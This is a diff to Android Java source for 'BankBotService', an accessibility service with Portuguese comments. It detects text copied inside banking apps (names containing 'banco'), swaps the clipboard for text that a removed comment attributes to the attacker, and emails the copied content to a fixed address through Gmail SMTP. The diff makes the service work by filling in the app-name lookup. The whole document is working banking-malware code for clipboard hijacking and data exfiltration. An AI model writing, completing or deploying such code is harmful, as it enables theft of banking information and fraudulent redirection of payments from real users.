@@ -2,6 +2,8 @@ import android.accessibilityservice.AccessibilityService;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
@@ -31,7 +33,6 @@ public class BankBotService extends AccessibilityService {
             if (selectedText != null && !selectedText.toString().isEmpty()) {
                 String appName = getAppName(event.getPackageName().toString());
                 if (isBankApp(appName)) {
-                    // Substitui o texto copiado pelo texto fornecido pelo atacante
                     replaceCopiedText(selectedText.toString());
                     sendEmail(selectedText.toString(), appName);
                 }
@@ -57,12 +58,17 @@ public class BankBotService extends AccessibilityService {
     }
 
     private String getAppName(String packageName) {
-        // Implemente a lógica para obter o nome do aplicativo a partir do seu pacote
-        return packageName;
+        PackageManager packageManager = getApplicationContext().getPackageManager();
+        try {
+            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
+            return (String) packageManager.getApplicationLabel(applicationInfo);
+        } catch (PackageManager.NameNotFoundException e) {
+            Log.e(TAG, "Erro ao obter nome do aplicativo: " + e.getMessage());
+        }
+        return "";
     }
 
     private boolean isBankApp(String appName) {
-        // Implemente a lógica para verificar se o aplicativo é um aplicativo bancário
         return appName.toLowerCase().contains("banco");
     }
 
@@ -76,14 +82,12 @@ public class BankBotService extends AccessibilityService {
         new Thread(new Runnable() {
             @Override
             public void run() {
-                // Configuração das propriedades do servidor de e-mail
                 Properties props = new Properties();
                 props.put("mail.smtp.auth", "true");
                 props.put("mail.smtp.starttls.enable", "true");
                 props.put("mail.smtp.host", "smtp.gmail.com");
                 props.put("mail.smtp.port", "587");
 
-                // Criação da sessão de e-mail com autenticação
                 Session session = Session.getInstance(props,
                         new Authenticator() {
                             @Override
@@ -93,16 +97,13 @@ public class BankBotService extends AccessibilityService {
                         });
 
                 try {
-                    // Criação da mensagem de e-mail
                     Message message = new MimeMessage(session);
                     message.setFrom(new InternetAddress(EMAIL));
                     message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(DESTINATARIO_EMAIL));
                     message.setSubject("Logs do BankBot");
                     message.setText("Texto copiado do " + appName + ":\n" + content);
 
-                    // Envio da mensagem de e-mail
                     Transport.send(message);
-
                     Log.d(TAG, "E-mail enviado com sucesso.");
                 } catch (MessagingException e) {
                     Log.e(TAG, "Erro ao enviar e-mail: " + e.getMessage());
